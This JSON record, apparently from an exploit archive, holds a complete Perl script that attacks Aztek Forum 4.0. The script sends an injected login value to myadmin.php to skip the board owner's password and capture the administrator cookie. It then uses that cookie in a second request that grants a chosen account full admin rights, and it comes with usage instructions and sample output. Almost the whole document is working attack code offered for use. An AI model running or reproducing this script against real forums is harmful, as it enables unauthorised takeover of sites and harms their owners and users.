{
  "id": "1616",
  "title": "Aztek Forum 4.0 - &#039;myadmin.php&#039; User Privilege Escalation",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\n# Aztek Forum 4.00 Change User Rights Remote Exploit\r\n#\r\n# only if the magic_quote are : OFF <<<<<<<<<<<<<<<<<<<<<<\r\n#\r\n# Hum hum , sorry for my bad english i'm french ;)\r\n# Note : Before using this exploit you must create a count on the board :) \r\n# And this count will receive the administrator\r\n# rights !\r\n# aztek_gar.pl <host> <path> <board_owner> <user>\r\n# aztek_gar.pl 127.0.0.1 /aztek/ Admin Attacker\r\n#\r\n#\r\n#+------------------------------------------------------------+\r\n#- Aztek 4.0 Give Admin rights to a normal user   -\r\n#-                                                                           \r\n#     -\r\n#-                         coded by _Sparah_                      -\r\n#+-----------------------------------------------------------+\r\n#\r\n# [~] Connection to 127.0.0.1 on port 80 ...\r\n#\r\n# [+] CoOkie : ATK_ADMIN=6688f12bf61a432c22e38c46a194e6ea\r\n#\r\n# [!] D0ne !\r\n\r\n# var\r\n$host = $ARGV[0];\r\n$path = $ARGV[1];\r\n$owner = $ARGV[2];\r\n$user = $ARGV[3];\r\n\r\n#banner\r\nif (@ARGV<4) {\r\nprint q(\r\n\r\n+--------+\r\n| banner |\r\n+---------------------------------------------+\r\n|Aztek 4.0 Give Admin Rights to a normal user |\r\n|                                             |\r\n|                              by _Sparah_    |\r\n+---------------------------------------------+\r\n                    -=[X]=-\r\n+---------------------------------------------+\r\n| http://www.eos-team.be/                     |\r\n| http://sparah.next-touch.com/ (soon)        |\r\n+---------------------------------------------+\r\n                    -=[X]=-\r\n+---------------------------------------------+\r\n| Usage :                                     |\r\n|                                             |\r\n| *.pl <host> <path> <board_owner> <user>     |\r\n| ex : 127.0.0.1 /aztek/ Admin Attacker       |\r\n|                                             |\r\n+---------------------------------------------+\r\n                                       | E.o.S|\r\n                                       +------+\r\n\r\n);exit();}\r\n\r\nprint \"\r\n\r\n+----------------------------------------------+\r\n- Aztek 4.0 Give Admin rights to a normal user -\r\n-                                              -\r\n-                         coded by _Sparah_    -\r\n+----------------------------------------------+\r\n\r\n\";\r\n\r\nprint \"\\n[~] Connection to $host on port 80 ...\\n\";\r\n\r\n#1st request\r\n$req1= \"login=\".$owner.\"%27%23&passwd=\";\r\n$len1= length $req1;\r\n\r\n$send = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$host\", PeerPort \r\n=> \"80\") || die \"\\n[-] Connection failed...\";\r\nprint $send \"POST \".$path.\"myadmin.php?action=login HTTP/1.1\\n\";\r\nprint $send \"Host: $host\\n\";\r\nprint $send \"Cookie: ATK_PASSWD=; ATK_LOGIN=nobody; ATK_SESS=\\n\";\r\nprint $send \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $send \"Content-Length: \".$len1.\"\\n\\n\";\r\nprint $send \"\".$req1.\"\\n\";\r\n\r\n# take cookie value\r\nwhile(chomp($cookie=<$send>))\r\n{\r\n    if ($cookie =~ /Set\\-Cookie\\: (\\S+)/)\r\n    {\r\n        $ATK=$1;\r\n        close($send);\r\n    }\r\n}\r\n\r\nprint \"\\n[+] CoOkie : \".$ATK.\"\\n\";\r\n\r\n# 2nd request\r\n$req2 = \r\n\"login=\".$user.\"&priv%5B%5D=0&priv%5B%5D=1&priv%5B%5D=4&priv%5B%5D=2&priv%5B%5D=3&priv%5B%5D=5\";\r\n$len2 = length $req2;\r\n$data = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$host\", PeerPort \r\n=> \"80\") || die \"\\n[-] Connection failed...\";\r\nprint $data \"POST \".$path.\"myadmin.php?action=admin&choix=6 HTTP/1.1\\n\";\r\nprint $data \"Host: \".$host.\"\\n\";\r\nprint $data \"Cookie: \".$ATK.\"\\n\";\r\nprint $data \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $data \"Content-Length: \".$len2.\"\\n\\n\";\r\nprint $data \"\".$req2.\"\\n\";\r\nread $data,$res,9000;\r\nprint $res;\r\nprint \"\\n[!] D0ne !\\n\\n\";\r\n\r\n# milw0rm.com [2006-03-26]",
  "url": "https://www.exploit-db.com/exploits/1616"
}